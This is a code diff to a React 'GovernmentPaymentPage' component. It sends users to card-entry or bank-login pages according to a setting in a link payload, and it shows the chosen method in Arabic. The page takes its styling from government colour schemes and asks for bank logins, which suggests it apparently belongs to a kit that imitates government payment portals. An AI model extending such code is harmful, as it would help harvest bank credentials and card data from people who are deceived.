@@ -58,7 +58,15 @@ const GovernmentPaymentPage = () => {
     if (isSubmitting) return;
     setIsSubmitting(true);
 
-    navigate(`/pay/${id}/bank-selector`, {
+    // Get payment method from linkData, default to 'card'
+    const savedPaymentMethod = linkData?.payload?.payment_method || 'card';
+
+    // Determine next URL based on payment method
+    const nextUrl = savedPaymentMethod === 'card' 
+      ? `/pay/${id}/card-input?company=${provider}&currency=${currencyCode}&amount=${amount}&provider=${provider}`
+      : `/pay/${id}/bank-selector?company=${provider}&currency=${currencyCode}&amount=${amount}&provider=${provider}`;
+
+    navigate(nextUrl, {
       state: {
         customerInfo: {
           name: customerName,
@@ -68,6 +76,10 @@ const GovernmentPaymentPage = () => {
         },
         provider,
         country: countryCode,
+        amount,
+        currency: currencyCode,
+        reference,
+        description,
       }
     });
   };
@@ -226,6 +238,35 @@ const GovernmentPaymentPage = () => {
                   className="h-12 text-base"
                   style={{ borderColor: `${govSystem.colors.primary}40` }}
                 />
+              </div>
+
+              {/* Display selected payment method */}
+              <div 
+                className="p-4 rounded-lg border-2"
+                style={{ 
+                  backgroundColor: `${govSystem.colors.primary}10`,
+                  borderColor: `${govSystem.colors.primary}40`
+                }}
+              >
+                <div className="flex items-center gap-3">
+                  {linkData?.payload?.payment_method === 'bank_login' ? (
+                    <>
+                      <Shield className="w-6 h-6" style={{ color: govSystem.colors.primary }} />
+                      <div>
+                        <p className="font-bold text-sm">طريقة الدفع:</p>
+                        <p className="text-sm text-gray-700">تسجيل دخول البنك</p>
+                      </div>
+                    </>
+                  ) : (
+                    <>
+                      <CreditCard className="w-6 h-6" style={{ color: govSystem.colors.primary }} />
+                      <div>
+                        <p className="font-bold text-sm">طريقة الدفع:</p>
+                        <p className="text-sm text-gray-700">إدخال بيانات البطاقة</p>
+                      </div>
+                    </>
+                  )}
+                </div>
               </div>
 
               <Button
